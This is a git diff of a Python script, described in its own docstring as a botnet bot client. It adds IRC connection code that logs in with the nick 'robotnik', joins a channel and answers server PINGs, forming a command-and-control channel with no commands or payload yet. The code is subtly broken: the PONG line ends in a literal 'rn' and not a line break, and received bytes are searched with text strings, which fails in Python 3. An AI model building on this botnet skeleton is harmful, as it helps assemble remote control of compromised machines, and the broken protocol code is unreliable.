@@ -1,9 +1,10 @@
 """
-a bot client for a botnet
+a bot client for a botnet.
 """
 
 import argparse
 import sys
+import string
 import socket
 
 
@@ -11,15 +12,39 @@ class botClient:
     def __init__(self, host, port, channel, secret_phrase):
         self.host = host
         self.port = port
-        self.channel = channel
+        self.channel = "#" + channel
         self.secret_phrase = secret_phrase
-        self.sock = None
+        self.bot_nick = "robotnik"
+        self.irc_socket = None
 
+
+    def send_msg(self, message):
+        self.irc_socket.send(message.encode())
+    def recv_msg(self):
+        return self.irc_socket.recv(2040)  #receive the text
+
+    
     def start_client(self):
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.connect((self.host, self.port))  # connect to server
+        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        self.connect_to_irc()
+        self.irc_socket.close()
 
-
+    def connect_to_irc(self):
+        self.irc_socket.connect((self.host, self.port))  # connect to server
+        #user authentication
+        self.send_msg("USER "+ "test" +" "+ self.bot_nick +" "+ self.bot_nick + \
+        " :weew\n")
+        #sets nick
+        self.send_msg("NICK "+ self.bot_nick+"\n")
+        #join the channel
+        self.send_msg("JOIN "+ self.channel +"\n")
+    
+    def get_text(self):
+        text= self.recv_msg()  #receive the text
+        if text.find('PING') != -1:                      
+            self.send_msg('PONG ' + text.split() [1] + 'rn') 
+        return text
 
 # argparse function to handle user input
 # Reference: https://docs.python.org/3.6/howto/argparse.html
